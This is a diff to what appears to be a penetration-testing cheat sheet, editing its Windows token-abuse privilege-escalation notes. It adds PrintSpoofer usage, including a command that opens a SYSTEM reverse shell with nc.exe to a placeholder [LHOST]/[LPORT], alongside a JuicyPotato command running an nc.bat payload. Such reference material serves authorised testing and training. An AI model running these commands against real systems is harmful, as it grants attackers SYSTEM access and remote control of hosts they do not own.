@@ -890,16 +890,25 @@ cmd> .\uac-bypass.exe
 
 ### Access Token Abuse
 
-Walkthrough: https://www.notion.so/CHEATSHEET-ef447ed5ffb746248fec7528627c0405#5cedd479d1c1429e8018211371eec1ad
+Abuse is possible if `SeImpersonatePrivilege` or `SeAssignPrimaryPrivilege` is enabled
+* Walkthrough: https://www.notion.so/CHEATSHEET-ef447ed5ffb746248fec7528627c0405#5cedd479d1c1429e8018211371eec1ad
+* Windows CLSIDs: http://ohpe.it/juicy-potato/CLSID/
 
-Windows CLSIDs: http://ohpe.it/juicy-potato/CLSID/
-
-
-JuicyPotato - `SeImpersonatePrivilege` or `SeAssignPrimaryPrivilege` is enabled
+JuicyPotato - All older versions of Windows
 ```
-# Edit nc.bat with correct params and transfer to remote host
+# edit nc.bat with correct params and transfer to remote host
 cmd> whoami /privs
 cmd> JuicyPotato.exe -p C:\inetpub\wwwroot\nc.bat -l 443 -t * -c
+```
+
+PrintSpoofer - Windows 10 and Server 2016/2019
+* Leverages the Print Spooler service to get a SYSTEM token, then run a custom command
+```
+# spawn a SYSTEM command prompt
+cmd> printspoofer.exe -i -c cmd
+
+# get a SYSTEM reverse shell
+cmd> printspoofer.exe -c "C:\temp\nc.exe [LHOST] [LPORT] -e cmd.exe"
 ```
 
 ## Firewall Disabling
